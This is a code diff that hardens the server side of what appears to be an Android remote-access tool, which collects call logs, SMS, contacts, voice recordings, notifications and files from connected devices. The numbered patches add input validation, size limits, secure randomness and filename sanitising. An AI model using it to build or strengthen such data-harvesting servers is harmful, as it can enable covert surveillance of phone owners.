@@ -158,13 +158,24 @@ class Clients {
                 // Ayy, time to recieve a file!
                 logManager.log(CONST.logTypes.info, "Recieving File From" + clientID);
 
-                if (!data.buffer || !data.name) return;
+                if (!data.buffer || !data.name || typeof data.name !== 'string') return;
+                
+                // Patch 4: Enforce size limit (100MB)
+                if (!Buffer.isBuffer(data.buffer) && !(data.buffer instanceof Uint8Array)) return;
                 if (data.buffer.length > 100 * 1024 * 1024) return logManager.log(CONST.logTypes.error, "File upload too large from " + clientID);
 
-                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                // Patch 2 & 7: Secure random hex
+                let hash = crypto.randomBytes(16).toString('hex');
                 let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
-                let lastDot = data.name.lastIndexOf(".");
-                let fileExt = (lastDot !== -1) ? data.name.substring(lastDot) : '.unknown';
+                
+                // Patch 3 & 8: Sanitize name
+                let sanitizedName = path.basename(data.name);
+                let lastDot = sanitizedName.lastIndexOf(".");
+                let fileExt = (lastDot !== -1) ? sanitizedName.substring(lastDot) : '.bin';
+                
+                // Patch 9: Whitelist extensions to prevent XSS
+                const allowedExts = ['.jpg', '.png', '.mp3', '.mp4', '.txt', '.pdf', '.zip', '.apk', '.bin'];
+                if (!allowedExts.includes(fileExt.toLowerCase())) fileExt = '.bin';
 
                 let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
 
@@ -174,7 +185,8 @@ class Clients {
                         client.get('downloads').push({
                             time: new Date(),
                             type: "download",
-                            originalName: data.name,
+                            // Patch 10: Limit originalName length
+                            originalName: sanitizedName.substring(0, 255),
                             path: CONST.downloadsFolder + '/' + fileKey + fileExt
                         }).write();
                         logManager.log(CONST.logTypes.success, "File From" + clientID + " Saved");
@@ -189,12 +201,13 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.call, (data) => {
-            if (data.callsList) {
+            if (data.callsList && Array.isArray(data.callsList)) {
                 if (data.callsList.length !== 0) {
                     let callsList = data.callsList;
                     let dbCall = client.get('CallData');
                     let newCount = 0;
                     callsList.forEach(call => {
+                        if (!call.phoneNo || !call.date) return;
                         let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
                         if (dbCall.find({ hash }).value() === undefined) {
                             // cool, we dont have this call
@@ -212,10 +225,12 @@ class Clients {
         socket.on(CONST.messageKeys.sms, (data) => {
             if (typeof data === "object") {
                 let smsList = data.smslist;
-                if (smsList.length !== 0) {
+                // Patch 6: Validate smsList
+                if (smsList && Array.isArray(smsList) && smsList.length !== 0) {
                     let dbSMS = client.get('SMSData');
                     let newCount = 0;
                     smsList.forEach(sms => {
+                        if (!sms.address || !sms.body) return;
                         let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
                         if (dbSMS.find({ hash }).value() === undefined) {
                             // cool, we dont have this sms
@@ -234,10 +249,11 @@ class Clients {
             if (data.file && data.name && data.buffer) {
                 logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
 
+                // Patch 4: Enforce size limit (10MB for voice)
                 if (!Buffer.isBuffer(data.buffer) && !(data.buffer instanceof Uint8Array)) return;
                 if (data.buffer.length > 10 * 1024 * 1024) return logManager.log(CONST.logTypes.error, "Voice record too large from " + clientID);
 
-                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
+                let hash = crypto.randomBytes(16).toString('hex');
                 let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                 
                 let sanitizedName = path.basename(data.name);
@@ -251,7 +267,8 @@ class Clients {
                         client.get('downloads').push({
                             "time": new Date(),
                             "type": "voiceRecord",
-                            "originalName": sanitizedName,
+                            // Patch 10: Limit originalName length
+                            "originalName": sanitizedName.substring(0, 255),
                             "path": CONST.downloadsFolder + '/' + fileKey + fileExt
                         }).write();
                     } else {
@@ -305,8 +322,9 @@ class Clients {
                     let dbContacts = client.get('contacts');
                     let newCount = 0;
                     contactsList.forEach(contact => {
+                        if (!contact.phoneNo) return;
                         contact.phoneNo = contact.phoneNo.replace(/\s+/g, '');
-                        let hash = crypto.createHash('md5').update(contact.phoneNo + contact.name).digest("hex");
+                        let hash = crypto.createHash('md5').update(contact.phoneNo + (contact.name || '')).digest("hex");
                         if (dbContacts.find({ hash }).value() === undefined) {
                             // cool, we dont have this call
                             contact.hash = hash;
@@ -383,25 +401,26 @@ class Clients {
             let clientData = clientDB.value();
 
             let pageData;
+            let safeFilter = (typeof filter === 'string') ? filter : undefined;
 
             if (page === "calls") {
                 pageData = clientDB.get('CallData').sortBy('date').reverse().value();
-                if (filter) {
-                    let filterData = clientDB.get('CallData').sortBy('date').reverse().value().filter(calls => calls.phoneNo.substr(-6) === filter.substr(-6));
+                if (safeFilter) {
+                    let filterData = clientDB.get('CallData').sortBy('date').reverse().value().filter(calls => calls.phoneNo.substr(-6) === safeFilter.substr(-6));
                     if (filterData) pageData = filterData;
                 }
             }
             else if (page === "sms") {
                 pageData = clientData.SMSData;
-                if (filter) {
-                    let filterData = clientDB.get('SMSData').value().filter(sms => sms.address.substr(-6) === filter.substr(-6));
+                if (safeFilter) {
+                    let filterData = clientDB.get('SMSData').value().filter(sms => sms.address.substr(-6) === safeFilter.substr(-6));
                     if (filterData) pageData = filterData;
                 }
             }
             else if (page === "notifications") {
                 pageData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
-                if (filter) {
-                    let filterData = clientDB.get('notificationLog').sortBy('postTime').reverse().value().filter(not => not.appName === filter);
+                if (safeFilter) {
+                    let filterData = clientDB.get('notificationLog').sortBy('postTime').reverse().value().filter(not => not.appName === safeFilter);
                     if (filterData) pageData = filterData;
                 }
             }
@@ -465,7 +484,7 @@ class Clients {
         else {
             // yep, it could cause a clash, but c'mon, realistically, it won't, theoretical max que length is like 12 items, so chill?
             // Talking of clashes, enjoy -> https://www.youtube.com/watch?v=EfK-WX2pa8c
-            commandPayload.uid = Math.floor(Math.random() * 10000);
+            commandPayload.uid = crypto.randomBytes(4).readUInt32BE(0) % 10000;
             commandQue.push(commandPayload).write();
             return cb(false)
         }
